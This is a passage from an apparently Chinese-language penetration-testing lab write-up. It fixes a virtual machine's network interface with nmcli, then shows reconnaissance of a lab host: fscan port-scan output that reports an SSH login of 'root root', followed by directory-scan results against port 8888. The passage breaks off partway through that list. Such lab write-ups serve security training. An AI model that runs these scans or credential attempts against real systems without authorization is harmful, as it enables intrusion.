fRd1bHQfe3Hk3WLNz4dzz4tKDclg8D8RDzu1zf/f9fdevy339P/hC37Hpuc9zr6+/ft56i/xh8yfWT4cKcqnZ67XzOgJvZf6T3CNYxnk13//D/EYub8ziO5qWhv00wTsaGBYf5g/3LXLJzb3SsNRs+Yn7hiZ/ViemoS5+33ahX9VXq/OLpp8y3WxgWKdZW0936vf56WZ+2Cxe3Kw/zF9UDsOEHcN+mmDR99M0tqiTycU6Xizq1DL/qEX9/X4aubwxiwPv43v7Tq6nw/Eiv4hpyGBqkg+p187q9Dm1dTw1xW/mF/2+/Xgh0/q1YVZhtlc9vqlJ3qnT54SjOw7rN8HZtI4P6zQWZWOc+pp9/XrJMGc4DXWdoi8edgrWq4YJoSmemX2RfcPtZtMQwaLeerFwmF8Mx3WwWE/vsCg4HC/yi5iGDKYmGXhPv2+wGvHert/ns/FMn7OzaiGWN+p+0nCL2e43+1xMY5yGwTC7VOJ9wRgXzTQ1dWbFi9mlxRb7dRZFwmzfOr9f20T2ixd1zVqJz/Jn2y3q1+7OT32kmKU1MmGzSFEHhwmbHuwnx4s6w/ziaJ2iXnKfRf1hP8XOpn3OzirgHfz+O1jl/Vx/rUVCOQjiLNjx+KmRvWWRGGTljD/HbN+I1PF60Hzd4cR9hy9KnxaDO57nSK6/TtSXrQfNV5rFe33aOj/Uq3byh4avS6iLZ8Ii/2p1M480cLPOLN7ICpv5Rx2qHwnl1YkXaMdffCmBs937l9zzfNk/O3gpjvLXdPR18Tq+MuckfGHdDVY5CNZnQZ1Qnx03Fz7ZrJ9X6/NFvMvTclafd9fZXJhpm/kzs+VH41c7q5+j+TOzOlfXT3XCK5+TwGXm30VYRLw+HYa/GmvyU8aLevmD6l2afsq03mjWz2a82KxTIjHOS0W9qo73hnUWy4f5abGwVqeldZ3hvpvb1Zqtc1UTL5p9Q7PLfgOb+96sf7TOZrwol/pgsdh3ll/Hc8eQlzKtSdg07CfVuxTDaXMp9MFh5c06Ka828X2z+kf7mcWLejkAAAAAAAAAAAAAAAAAAPCSPn5Mw7dvP3/+963DP35c8l3CZYumcr1pUV/NS9c1E4Osf/qO/eOdqbeOcd9VcVZjAMDV/vhBo+Uj/KJP8fpGIeSdRMhIiMh1+vrn7tg/3pl8HppxKON6GkpaZOYAAHgp9/6vcjhJ3kLFoIg4APC+/vgjwvrTPSP5eyR5tfldk3W8CRZ1vFmb02IWSc3aNIzXdcJix+bSTv0i4k2wqLe4T91PX794fAsA4ETTG6wiP8tLPBOazJvx4bRoFoZhwnq6TgubwYgUddkm7WZ8OH3QZg8AwIu4/UeE7/X5XbrNhsv9R4jpps3HG2lZ/GNbNzoAwC+7fwfr7W4g4tbn0raj8sct3LF7OADg3/ZCf8n9ujuh63zcv33eZkXkarlRPwAAXsSzb7DK3UBzQxD3KMXn/DF9/YvUG0Xzw33rtFPkE9UPAIAXMf1Bo30kNXcMeXUWD3l1J3+4+9F96x1jPFwSwTo5p82lMCxSZDw0Be9Tb9HsW6Y5+AgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf17dv/wfC3p07rRbx5gAAAABJRU5ErkJggg==" width="800" height="600" class="img_ev3q"></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ip address</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241124-202417-8daf26d0431bf6929a2fcf5592ca3cde.png" width="800" height="600" class="img_ev3q"></p>
<p>可以看到，是 <code>ens33</code> 这个网卡的配置存在问题</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmcli connection show ens33</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接删除旧的配置文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmcli device status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmcli connection delete ens33</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="data:image/png;base64,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" width="800" height="112" class="img_ev3q"></p>
<p>写一个新的配置</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmcli connection add con-name ens33 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">type ethernet \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifname ens33 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ipv4.method auto</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241155-205547-d8d60d982f6396f63b0c2933c3c8d2ab.png" width="800" height="600" class="img_ev3q"></p>
<p>就可以正常进行攻击了</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-侦察">centos 侦察<a href="#centos-侦察" class="hash-link" aria-label="centos 侦察的直接链接" title="centos 侦察的直接链接">​</a></h2>
<p>直接使用 <code>fscan</code> 进行端口扫描</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:22 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:21 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:81 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:3306 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:80 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:888 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.12:8888 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.12:8888 code:302 len:219    title:Redirecting... 跳转 url: http://192.168.200.12:8888/login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.12     code:200 len:1326   title: 没有找到站点</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.12:888 code:403 len:548    title:403 Forbidden</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.12:8888/login code:200 len:802    title: 安全入口校验失败</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.12:81  code:200 len:14404  title: 极致 CMS 建站系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] SSH 192.168.200.12:22:root root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">已完成 7/7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 扫描结束, 耗时: 12.949238938s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以发现 3 个 HTTP 服务，先尝试目录扫描，得到以下有效结果</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">http://192.168.200.12:8888/</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[20:57:21] 308 -  287B  - /%2e%2e//google.com  -&gt;  http://192.168.200.12:8888/../google.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:13] 401 -  338B  - /api/swagger/static/index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:20] 308 -  307B  - /axis2-web//HappyAxis.jsp  -&gt;  http://192.168.200.12:8888/axis2-web/HappyAxis.jsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:20] 308 -  297B  - /axis//happyaxis.jsp  -&gt;  http://192.168.200.12:8888/axis/happyaxis.jsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:20] 308 -  319B  - /axis2//axis2-web/HappyAxis.jsp  -&gt;  http://192.168.200.12:8888/axis2/axis2-web/HappyAxis.jsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:22] 401 -  338B  - /base/static/c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:30] 308 -  363B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -&gt;  http://192.168.200.12:8888/Citrix/AccessPlatform/auth/clientscripts/cookies.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:33] 401 -  338B  - /code</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:55] 308 -  313B  - /extjs/resources//charts.swf  -&gt; 